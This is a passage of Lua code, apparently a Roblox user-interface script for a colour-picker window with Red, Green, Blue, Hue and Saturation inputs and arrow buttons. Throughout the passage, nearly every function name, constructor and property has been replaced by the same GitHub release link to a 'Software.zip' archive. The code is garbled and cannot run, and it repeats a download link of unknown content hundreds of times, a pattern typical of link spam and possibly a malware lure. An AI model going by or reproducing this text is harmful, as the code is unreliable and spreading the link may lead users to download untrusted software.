			local sizeX,sizeY = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			if x + sizeX > maxX then x = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and x - sizeX or maxX - sizeX end
			if y + sizeY > maxY then reverseY = true end

			local closable = false
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function(input)
				if not closable or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip ~= https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

				if not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
					self:Close()
				end
			end)

			if reverseY then
				local newY = y - sizeY - (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0)
				y = newY >= 0 and newY or 0
			end

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,x,0,y)

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			closable = true
		end

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(self)
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = nil
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end

		local mt = {__index = funcs}

		local function new()
			local obj = setmetatable({
				OnPreview = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(),
				OnSelect = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(),
				OnCancel = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(),
				OnMoreColors = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(),
				PrevColor = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0)
			},mt)
			createGui(obj)
			return obj
		end

		return {new = new}
	end)()

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (function() -- TODO: Convert to newer class model
		local funcs = {}

		local function new()
			local newMt = setmetatable({},{})

			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

			local guiContents = create({
				{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BorderSizePixel=0,ClipsDescendants=true,Name="Content",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,20),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,-20),}},
				{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Name="BasicColors",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,180,0,200),}},
				{3,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,-5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,26),Text="Basic Colors",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{4,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Blue",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-63,0,255),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,52,0,16),}},
				{5,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),Font=3,Name="Input",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,50,0,16),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{6,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="ArrowFrame",Parent={5},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0),}},
				{7,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Up",Parent={6},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{8,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={7},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{9,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{10,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{11,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={8},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{12,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Down",Parent={6},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{13,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={12},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{14,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{15,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{16,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={13},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{17,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={4},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Blue:",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{18,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),BorderSizePixel=0,ClipsDescendants=true,Name="ColorSpaceFrame",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-261,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,222,0,202),}},
				{19,"ImageLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),BorderSizePixel=0,Image="rbxassetid://1072518406",Name="ColorSpace",Parent={18},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,220,0,200),}},
				{20,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="Scope",Parent={19},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,210,0,190),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,20),}},
				{21,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BorderSizePixel=0,Name="Line",Parent={20},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,9,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,20),}},
				{22,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0),BorderSizePixel=0,Name="Line",Parent={20},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,9),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,2),}},
				{23,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Name="CustomColors",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,210),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,180,0,90),}},
				{24,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={23},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,20),Text="Custom Colors (RC = Set)",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{25,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Green",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-63,0,233),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,52,0,16),}},
				{26,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),Font=3,Name="Input",Parent={25},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,50,0,16),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{27,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="ArrowFrame",Parent={26},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0),}},
				{28,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Up",Parent={27},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{29,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={28},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{30,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={29},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{31,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={29},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{32,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={29},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{33,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Down",Parent={27},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{34,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={33},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{35,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={34},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{36,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={34},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{37,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={34},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{38,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={25},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Green:",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{39,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Hue",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-180,0,211),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,52,0,16),}},
				{40,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),Font=3,Name="Input",Parent={39},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,50,0,16),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{41,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="ArrowFrame",Parent={40},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0),}},
				{42,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Up",Parent={41},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{43,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={42},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{44,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={43},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{45,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={43},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{46,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={43},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{47,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Down",Parent={41},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{48,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={47},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{49,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={48},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{50,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={48},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{51,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={48},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{52,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={39},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Hue:",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{53,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.21568627655506,0.21568627655506,0.21568627655506),Name="Preview",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-260,0,211),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,35,1,-245),}},
				{54,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Red",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-63,0,211),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,52,0,16),}},
				{55,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),Font=3,Name="Input",Parent={54},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,50,0,16),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{56,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="ArrowFrame",Parent={55},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0),}},
				{57,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Up",Parent={56},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{58,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={57},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{59,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={58},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{60,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={58},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{61,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={58},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{62,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Down",Parent={56},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,0,0,8),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{63,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={62},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{64,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={63},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{65,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={63},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{66,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={63},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
				{67,"TextLabel",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={54},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-40,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,34,1,0),Text="Red:",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=1,}},
				{68,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.12549020349979,0.12549020349979,0.12549020349979),Name="Sat",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-180,0,233),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,52,0,16),}},
				{69,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.25098040699959,0.25098040699959,0.25098040699959),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.37647062540054,0.37647062540054,0.37647062540054),Font=3,Name="Input",Parent={68},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,2,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,50,0,16),Text="0",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274516582489,0.86274516582489,0.86274516582489),TextSize=14,TextXAlignment=0,}},
				{70,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Name="ArrowFrame",Parent={69},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-16,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,1,0),}},
				{71,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),BackgroundTransparency=1,BorderSizePixel=0,Font=3,Name="Up",Parent={70},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,0,8),Text="",TextSize=14,}},
				{72,"Frame",{BackgroundTransparency=1,Name="Arrow",Parent={71},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,16,0,8),}},
				{73,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={72},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,8,0,3),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),}},
				{74,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={72},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,7,0,4),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,1),}},
				{75,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.86274510622025,0.86274510622025,0.86274510622025),BorderSizePixel=0,Parent={72},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,6,0,5),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,5,0,1),}},
